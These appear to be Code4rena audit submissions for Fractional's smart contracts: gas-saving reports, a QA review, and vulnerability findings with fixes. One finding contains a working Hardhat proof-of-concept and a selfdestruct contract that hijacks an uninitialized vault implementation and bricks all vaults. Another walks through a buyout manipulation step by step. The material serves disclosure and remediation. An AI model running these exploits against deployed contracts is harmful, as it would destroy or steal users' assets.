├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 135183                                    ┆ 707             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name                             ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ memoryBytes                               ┆ 7551            ┆ 7551 ┆ 7551   ┆ 7551 ┆ 1       │ ╰───────────────────────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯  ``` ### Lines - FERC1155.sol:68  - FERC1155.sol:83  - FERC1155.sol:261  - Metadata.sol:24  - Multicall.sol:39  - Vault.sol:73  - Vault.sol:101  - Vault.sol:142  - MerkleBase.sol:45  - MerkleBase.sol:125  - Migration.sol:487  - VaultRegistry.sol:53  - VaultRegistry.sol:54  - VaultRegistry.sol:70  - VaultRegistry.sol:71  - VaultRegistry.sol:85  - VaultRegistry.sol:86  - VaultRegistry.sol:105  - VaultRegistry.sol:106  - VaultRegistry.sol:150  - VaultRegistry.sol:151  - VaultRegistry.sol:168  - VaultRegistry.sol:169   --- ## Use custom errors instead of string error messages  ```js contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testFailGas() public {         c0.stringErrorMessage();         c1.customErrorMessage();     } }  contract Contract0 {     function stringErrorMessage() public {         bool check = false;         require(check, "error message");     } }  contract Contract1 {     error CustomError();      function customErrorMessage() public {         bool check = false;         if (!check) {             revert CustomError();         }     } }  ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 34087              ┆ 200             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ stringErrorMessage ┆ 218             ┆ 218 ┆ 218    ┆ 218 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 26881              ┆ 164             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ customErrorMessage ┆ 161             ┆ 161 ┆ 161    ┆ 161 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - FERC1155.sol:267  - FERC1155.sol:285  - FERC1155.sol:297  - MerkleBase.sol:62  - MerkleBase.sol:78   --- ## Use assembly to check for address(0)  ```js   contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.ownerNotZero(address(this));         c1.assemblyOwnerNotZero(address(this));     } }  contract Contract0 {     function ownerNotZero(address _addr) public pure {         require(_addr != address(0), "zero address)");     } }  contract Contract1 {     function assemblyOwnerNotZero(address _addr) public pure {         assembly {             if iszero(_addr) {                 mstore(0x00, "zero address")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 61311              ┆ 338             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ ownerNotZero       ┆ 258             ┆ 258 ┆ 258    ┆ 258 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭──────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract   ┆                 ┆     ┆        ┆     ┆         │ ╞══════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 44893                ┆ 255             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name        ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyOwnerNotZero ┆ 252             ┆ 252 ┆ 252    ┆ 252 ┆ 1       │ ╰──────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - FERC1155.sol:128  - FERC1155.sol:173  - FERC1155.sol:233  - FERC1155.sol:277  - FERC1155.sol:297  - FERC1155.sol:303  - Migration.sol:228  - Migration.sol:267  - Migration.sol:304   ---  ## Mark functions as payable (with discretion) You can mark public or external functions as payable to save gas. Functions that are not payable have additional logic to check if there was a value sent with a call, however, making a function payable eliminates this check. This optimization should be carefully considered due to potentially unwanted behavior when a function does not need to accept ether.  ```js contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.isNotPayable();         c1.isPayable();     } }  contract Contract0 {     function isNotPayable() public view {         uint256 val = 0;         val++;     } }  contract Contract1 {     function isPayable() public payable {         uint256 val = 0;         val++;     } } ```  ### Gas Report ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 32081              ┆ 190             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ isNotPayable       ┆ 198             ┆ 198 ┆ 198    ┆ 198 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 29681              ┆ 178             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ isPayable          ┆ 174             ┆ 174 ┆ 174    ┆ 174 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines - targets:Supply.sol:23  - targets:Supply.sol:113  - FERC1155.sol:56  - FERC1155.sol:68  - FERC1155.sol:79  - FERC1155.sol:98  - FERC1155.sol:145  - FERC1155.sol:186  - FERC1155.sol:198  - FERC1155.sol:205  - FERC1155.sol:217  - FERC1155.sol:229  - FERC1155.sol:241  - FERC1155.sol:256  - FERC1155.sol:291  - FERC1155.sol:302  - FERC1155.sol:309  - FERC1155.sol:314  - SelfPermit.sol:18  - SelfPermit.sol:46  - Metadata.sol:24  - Metadata.sol:36  - SupplyReference.sol:22  - SupplyReference.sol:29  - Buyout.sol:112  - Buyout.sol:184  - Buyout.sol:244  - Buyout.sol:278  - Buyout.sol:311  - Buyout.sol:343  - Buyout.sol:376  - Buyout.sol:413  - Buyout.sol:450  - Buyout.sol:467  - VaultFactory.sol:26  - VaultFactory.sol:33  - VaultFactory.sol:55  - VaultFactory.sol:62  - Multicall.sol:11  - Vault.sol:24  - Vault.sol:73  - Vault.sol:86  - Vault.sol:93  - Vault.sol:101  - Minter.sol:24  - Minter.sol:32  - TransferReference.sol:17  - TransferReference.sol:30  - TransferReference.sol:45  - TransferReference.sol:61  - MerkleBase.sol:14  - MerkleBase.sol:43  - MerkleBase.sol:61  - MerkleBase.sol:73  - MerkleBase.sol:158  - Migration.sol:72  - Migration.sol:141  - Migration.sol:179  - Migration.sol:220  - Migration.sol:257  - Migration.sol:292  - Migration.sol:334  - Migration.sol:358  - Migration.sol:383  - Migration.sol:410  - Migration.sol:433  - Migration.sol:487  - VaultRegistry.sol:39  - VaultRegistry.sol:51  - VaultRegistry.sol:67  - VaultRegistry.sol:83  - VaultRegistry.sol:102  - VaultRegistry.sol:117  - VaultRegistry.sol:127  - VaultRegistry.sol:135  - VaultRegistry.sol:147  - BaseVault.sol:34  - BaseVault.sol:58  - BaseVault.sol:77  - BaseVault.sol:98  - BaseVault.sol:122  - targets:Transfer.sol:18  - targets:Transfer.sol:222  - targets:Transfer.sol:341  - targets:Transfer.sol:474   --- 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L206   # Vulnerability details  ### Description  The `end` function in the `Buyout` contract uses `IERC1155(token).balanceOf(address(this), id)` to determine the amount of deposited fraction tokens without distinguishing whether those fraction tokens are depositied by the `sellFractions` function or by direct transferring. Note that only the `sellFractions` function is constrained by `PROPOSAL_PERIOD`.  This vulnerability lets a 51-holder gain the whole batch of NFTs without paying for the rest 49\% fractions.  Assume a vault X creates 100 fraction tokens and the market-decided price of a fraction token is 1 ether (i.e., the ideal value of the locked NFTs in vault X is 100 ether). Let's also assume that Alice holds 51 tokens (maybe by paying 51 ether on opensea).  Followings are two scenarios, where the benign one follows the normal workflow and the malicious one exploits the vulnerability.  ### Benign Scenario  + Alice starts a buyout by depositing her 51 fraction tokens and 49 ether, making the `fractionPrice` 1 ether + Other users are satisfied with the provided price, and hence no one buys or sells their fraction tokens + The buyout succeeds:     + Alice gets the locked NFTs     + Other fraction holders can invoke `cash` to redeem their fraction tokens with a price of 1 ether + As a result, Alice paid 100 ether in total to get the locked NFTs.   ### Malicious Scenario  + Alice starts a buyout by depositing 0 fraction tokens and 1 wei, making the `fractionPrice` 0.01 wei.     + Note that Alice can create a separated account whose balance for the fraction token is 0, to start the buyout + No one is satisfied with the price (0.01 wei v/s 1 ether) and hence they will try to buy fraction tokens to reject the buyout     + Since there is not any fraction tokens locked in the `Buyout` contract from Alice, other users do not need to do anything + Alice invokes the `end` function     + But before invoking the `end` function, __Alice directly invokes `IERC1155(token).safeTransferFrom` to send the rest 51 fraction token to the `Buyout` contract__     + The `end` function will treat the buyout successful, since the `IERC1155(token).balanceOf(address(this), id)` is bigger than 50\%     + The above two message calls happen in a single transaction, hence no one can front-run + As a result     + __Alice only paid 51 ether to get the locked NFTs whose value is 100 ether__     + __Other fraction holders get nothing (but they had paid for the fraction token before)__  In short, a malicious users can buy any NFT by just paying half of the NFT's market price  ### Suggested Fix  For each buyout, add a new field to record the amount of fraction tokens deposited by `sellFractions`. And in the `end` function, use the newly-added field to determine whether the buyout can be processed or not.  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141   # Vulnerability details  ## Impact Migration.join() and Migration.leave() can still work after unsucessful migration. As I submitted with my high-risk finding "Migration.withdrawContribution() might work unexpectedly after unsuccessful migration.", withdraw logic after unsuccessful migration is different from the initial leave() logic and the withdrawal logic would be messy if users call join() and leave() after unsuccessful migration.   ## Proof of Concept According to the [explanation](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L23), join() and leave() functions must be called for 7 days before commition.  Currently, such a scenario is possible.  - Alice creates a new migration and commits after some joins. - The migration ended unsuccessfully after 4 days. - Then users can call leave() or withdrawContribution() to withdraw their deposits but it wouldn't work properly because we should recalculate eth/fractional amounts with returned amounts after unsuccessful migration.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps We should add some restrictions to join() and leave() functions so that users can call these functions for 7 days before the migration is committed.  We should add these conditions to [join()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L118) and [leave()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L150).  ``` require(!migrationInfo[_vault][_proposalId].isCommited, "committed already"); require(block.timestamp <= proposal.startTime + PROPOSAL_PERIOD, "proposal over"); ```  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238   # Vulnerability details  ## Impact In the end function of the Buyout contract, when the buyout fails, ERC1155 tokens are sent to the proposer. A malicious proposer can start a buyout using a contract that cannot receive ERC1155 tokens, and if the buyout fails, the end function fails because it cannot send ERC1155 tokens to the proposer. This prevents a new buyout from being started. ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238 ## Tools Used None ## Recommended Mitigation Steps Consider saving the status of the proposer after a failed buyout and implementing functions to allow the proposer to withdraw the ERC1155 tokens and eth  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25   # Vulnerability details   This is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.  The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode. Once the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).  ## Impact This is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.  Also, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).  ## Proof of Concept  I created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:  ```javascript const { ethers } = require("hardhat");  const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";  async function main() {     const [deployer, attacker] = await ethers.getSigners();      // Get all contract factories     const BaseVault = await ethers.getContractFactory("BaseVault");     const Supply = await ethers.getContractFactory("Supply");     const VaultRegistry = await ethers.getContractFactory("VaultRegistry");      // Deploy contracts      const registry = await VaultRegistry.deploy();     await registry.deployed();      const supply = await Supply.deploy(registry.address);     await supply.deployed();      // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's     const registryVaultFactory = await ethers.getContractAt("VaultFactory", await registry.factory());      const implVaultAddress = await registryVaultFactory.implementation();     const vaultImpl = await ethers.getContractAt("Vault", implVaultAddress);      const baseVault = await BaseVault.deploy(registry.address, supply.address);     await baseVault.deployed();     // proxy vault - the vault that's used by the user     let proxyVault = await deployVault(baseVault, registry, attacker);      const destructorFactory = await ethers.getContractFactory("Destructor");     const destructor = await destructorFactory.deploy();       let destructData = destructor.interface.encodeFunctionData("destruct", [attacker.address]);      const abi = new ethers.utils.AbiCoder();     const leafData = abi.encode(["address", "address", "bytes4"],         [attacker.address, destructor.address, destructor.interface.getSighash("destruct")]);     const leafHash = ethers.utils.keccak256(leafData);      await vaultImpl.connect(attacker).init();      await vaultImpl.connect(attacker).setMerkleRoot(leafHash);     // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case     await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);      // before: everything is fine     let implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log("Impl Vault code size before:", implVaultCode.length - 2); // -2 for the 0x prefix     let owner = await proxyVault.owner();     console.log("Proxy Vault works fine, owner is: ", owner);       await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);       // after: vault implementation is destructed     implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log("\nVault code size after:", implVaultCode.length - 2); // -2 for the 0x prefix      try {         owner = await proxyVault.owner();     } catch (e) {         console.log("Proxy Vault isn't working anymore.", e.toString().substring(0, 300));     } }  async function deployVault(baseVault, registry, attacker) {     const nodes = await baseVault.getLeafNodes();      const tx = await registry.connect(attacker).create(nodes[0], [], []);     const receipt = await tx.wait();      const vaultEvent = receipt.events.find(e => e.address == registry.address);      const newVaultAddress = vaultEvent.args._vault;     const newVault = await ethers.getContractAt("Vault", newVaultAddress);     return newVault; }   if (require.main === module) {     main() } ```  `Destructor.sol` file:  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.13;  contract Destructor{     function destruct(address payable dst) public {         selfdestruct(dst);     } } ```  Output: ``` Impl Vault code size before: 10386 Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3  Vault code size after: 0 Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2) ```  Sidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address. It's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case. This is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).  ## Tools Used Hardhat  ## Recommended Mitigation Steps    Add init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):  ```solidity contract Vault is IVault, NFTReceiver {     /// @notice Address of vault owner     address public owner;     /// ...      constructor(){         // initialize implementation         init();     }      /// @dev Initializes nonce and proxy owner     function init() public {  ```  Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.  ```solidity     /// @notice Initializes implementation contract     constructor() {         implementation = address(new Vault());         Vault(implementation).init();     }  ```    After mitigation the PoC will output this:  ``` Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'     at Vault._execute (src/Vault.sol:124)     at Vault.init (src/Vault.sol:24)     at HardhatNode._mineBlockWithPendingTxs     .... ```  
## Summary The developers have opted for a highly optimized and flexible smart contract architecture with the use of quite novel code (createWithImmutableArgs) and extensive assembly. However, as the developers are most likely fully aware, comes at the cost of much lower readability and can make the architecture and interdependence between different contracts quite confusing. I believe a small flow diagram to showcase how an example architecture would be deployed would be a massive help in understanding the architecture. On the other hand, the developers went above and beyond in commenting the code which was vitally important especially for such a complex architecture. In the future, I would be very careful when developing and adding new modules as in this case the contract is only as strong as its weakest link. When adding a new module, I would not only make sure that the module itself is secure but if it interacts with other modules then it does not introduce new vulnerabilities as the interdependence between modules is not always straightforward.  ### Issue #1 Incorrect memory expansion gas cost calculation Code used to calculate memory expansion cost is inconsistent with equation 326 in the [ethereum yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf)  This can cause incorrect errors to be reported  Currently the code is `cost += (returnDataWords-msizeWords) * COST_PER_WORD + (returnDataWords**2 - msizeWords**2) / MEMORY_EXPANSION_COEFFICIENT` when it should be `cost += (returnDataWords-msizeWords) * COST_PER_WORD + (returnDataWords - msizeWords)**2 / MEMORY_EXPANSION_COEFFICIENT`  Change ```solidity                         cost := add(                             cost,                             add(                                 mul(                                     sub(returnDataWords, msizeWords),                                     COST_PER_WORD                                 ),                                 div(                                     sub(                                         mul(returnDataWords, returnDataWords),                                         mul(msizeWords, msizeWords)                                     ),                                     MEMORY_EXPANSION_COEFFICIENT                                 )                             )                         ) ``` to ```solidity                         cost := add(                             cost,                             add(                                 mul(                                     sub(returnDataWords, msizeWords),                                     COST_PER_WORD                                 ),                                 div(                                     mul(                                         sub(returnDataWords, msizeWords),                                         sub(returnDataWords, msizeWords)                                     ),                                     MEMORY_EXPANSION_COEFFICIENT                                 )                             )                         ) ```  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L66-L81 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L156-L171 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L96-L117 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L281-L296 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L412-L427 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Transfer.sol#L642-L657 ### Issue #2 Storage check in `_execute()` from Vault.sol is obselete Currently `_execute()` contains the line: ```solidity         if (owner_ != owner) revert OwnerChanged(owner_, owner); ``` to make sure that the owner storage variable is not modified after the delegatecall. This check can be easily bypassed by modifying the other storage variables such as `nonce` (allows a user to reinitalise contract), `merkleRoot` (user can execute malicious permissions) or `methods` (a malicious plugin can be installed)  1. Either you can trust that the `_target` contracts will all be stateless and just remove the check to save gas OR 2. add extra checks to include the other storage variables (recommended)  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L132 ### Issue #3 Use of magic values Throughout the contracts, there is an inconsistent use of magic values where sometimes constants are used and sometimes magic values are used  e.g. Change ```solidity         uint256 buyoutPrice = (msg.value * 100) /             (100 - ((depositAmount * 100) / totalSupply));         uint256 fractionPrice = buyoutPrice / totalSupply; ``` to ```solidity uint256 public immutable PRECISION = 100; ...         uint256 buyoutPrice = (msg.value * PRECISION) /             (PRECISION - ((depositAmount * PRECISION) / totalSupply));         uint256 fractionPrice = buyoutPrice / totalSupply; ```  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L86-L88 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L208-L211 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L451 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L199 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L37 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L315 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L452 ### Issue #4 No check that `newVault` is not zero address in `migrateFractions()` In `migrateFractions()` from Migration.sol, the `newVault` address is read with no check that the address is not the zero address (which can occur if someone calls `migrateFractions()` before `settleVault()` is called). This causes the transaction to revert with no proper error message when the function attempts to send tokens.   Consider adding a check to produce a custom error if `newVault == address(0)`  Occurences: https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L466
